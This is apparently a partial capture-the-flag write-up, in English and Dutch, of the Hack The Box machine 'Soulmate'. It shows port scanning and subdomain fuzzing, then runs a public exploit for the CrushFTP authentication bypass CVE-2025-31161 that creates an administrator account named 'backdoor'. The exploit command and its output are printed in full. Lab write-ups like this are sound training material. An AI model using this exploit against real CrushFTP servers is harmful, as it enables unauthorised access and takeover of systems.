# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~]
└─$ nmap 10.129.14.246               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 12:36 CET
Nmap scan report for 10.129.14.246
Host is up (0.015s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~]
└─$ nmap -p22,80 -sCV 10.129.14.246
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 12:37 CET
Nmap scan report for soulmate.htb (10.129.14.246)
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Soulmate - Find Your Perfect Match
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ik ben gaan kijken naar webserver maar ik kan daar geen informatie vinden dat we kunnen gebruiken. Ik ben dus aan de hand van de FFUF tool gebruik gaan maken voor het zoeken naar een subdomain. Hieronder kan je zien dat ik de `ftp` subdomain gevonden heb.

```
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://soulmate.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -H "HOST:FUZZ.soulmate.htb" -ac

 :: Method           : GET
 :: URL              : http://soulmate.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41ms]
FTP                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 39ms]
```

Ik ben deze gaan toevoegen aan de hosts file en ben naar de webpagina gaan kijken. Ik ben gaan zoeken naar een exploit voor de ftpcrush server. Hierbij ben ik op de volgende url gevallen. https://github.com/Immersive-Labs-Sec/CVE-2025-31161
The vulnerability affects CrushFTP 10 (before 10.8.4) and version 11 (before 11.3.1) through an authentication bypass in the AWS4-HMAC authorization method
Ik ben nu de exploit gaan uitvoeren door de volgende code tegebruiken die je ook kan vinden op de github page maar door je eigen gegevens intevullen.

```
┌──(kali㉿kali)-[~/HTB/Soulmate/CVE-2025-31161]
└─$ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user backdoor --password Password123                                            
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: backdoor
   [*] Password: Password123
```

Als je probeerd inteloggen met de credentials die je zonet aangemaakt hebt, zal je kunnen zien dat we kunnen inloggen op de ftpscrush server.

![[Pasted image 20251215202900.png]]

Binnen de ftpcrush server ben ik gaan kijken in de admin panel en daar kan je zien dat er een User Manager gekent is. Ik ben dus nu gaan kijken welke users er allemaal bestaan. Zoals je hieronder zult kunnen zien zullen we waarschijnlijk gebruik kunnen maken van de `Ben, Jenna en crushadmin` users.